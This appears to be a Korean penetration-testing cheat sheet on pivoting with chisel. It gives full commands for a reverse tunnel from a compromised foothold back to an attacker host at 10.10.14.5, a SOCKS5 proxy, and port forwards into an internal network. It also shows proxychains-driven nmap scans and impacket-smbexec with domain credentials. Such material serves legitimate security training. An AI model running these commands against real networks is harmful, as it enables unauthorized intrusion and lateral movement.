# chisel로 터널·SOCKS5 프록시 구성

- chisel — HTTP 기반 단일 바이너리 터널 도구. 서버/클라이언트 구조로 로컬·리모트 포트포워드와 SOCKS5 프록시를 제공하며 리버스 커넥션(대상이 먼저 나로 접속)을 지원한다.
- 내부망에 발판 하나만 확보했을 때 SOCKS5로 내부 서비스를 스캔할 때, RDP·웹 같은 내부 포트를 공격 호스트로 끌어올 때, egress가 HTTP처럼 보여야 하는 환경에서 터널을 쓸 때.
- 공격 호스트와 대상에 같은 버전의 chisel 바이너리 필요(GitHub release의 linux_amd64·windows_amd64). Kali는 apt install chisel도 가능.

## 기본 구조

```text
공격 호스트: chisel server  (리슨 8000, --reverse 허용)
대상 발판:   chisel client  (공격 호스트:8000 으로 접속)
```

## 서버 실행 (공격 호스트, Kali)

```bash
chisel server -p 8000 --reverse
```

- `-p 8000`: 리슨 포트.
- `--reverse`: 클라이언트가 R: 리모트 포트포워드를 요청할 수 있게 허용.

## 클라이언트 실행 (대상 발판)

```bash
# SOCKS5 프록시 (공격 호스트 1080에 열림)
./chisel client 10.10.14.5:8000 R:socks

# 리모트 포트포워드 (공격 호스트 13389 -> 발판 내부 10.0.0.10:3389)
./chisel client 10.10.14.5:8000 R:13389:10.0.0.10:3389

# 로컬 포트포워드 (발판에서 10.0.0.10:80을 발판 8080으로)
./chisel client 10.10.14.5:8000 8080:10.0.0.10:80
```

- `R:socks`: R 접두사는 서버 쪽 리슨을 뜻하고, socks는 SOCKS5(기본 포트 1080)다.
- `R:<로컬포트>:<대상IP>:<대상포트>`: 공격 호스트의 포트를 발판 쪽 네트워크로 연결한다.

## proxychains 조합 (공격 호스트)

```bash
# /etc/proxychains4.conf 끝에 추가
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn -p 80,445,3389 10.0.0.0/24
proxychains curl http://10.0.0.10/
proxychains impacket-smbexec DOMAIN/user:pass@10.0.0.15
```

## 인증 옵션

```bash
chisel server -p 8000 --reverse --auth user:pass
./chisel client --auth user:pass 10.10.14.5:8000 R:socks
```

- `--auth user:pass`: 클라이언트 인증을 요구해 발판 유출 시 터널 남용을 줄인다.

## Windows 발판 예시

```powershell
workspace\pivoting\chisel\chisel.exe client 10.10.14.5:8000 R:socks
```

## 팁·트러블슈팅

1. 양쪽 버전이 다르면 프로토콜 에러가 난다. 같은 release 빌드로 맞춘다.
2. 서버에 1080이 이미 열려 있으면 R:socks가 실패한다. R:1081:socks처럼 포트를 바꿔준다.
3. nmap은 -sT -Pn으로 TCP connect 방식을 써야 SOCKS를 탄다(SYN 스캔 불가).
4. 연결이 바로 끊기면 발판의 8000 아웃바운드가 막혀 있는지 먼저 확인한다.
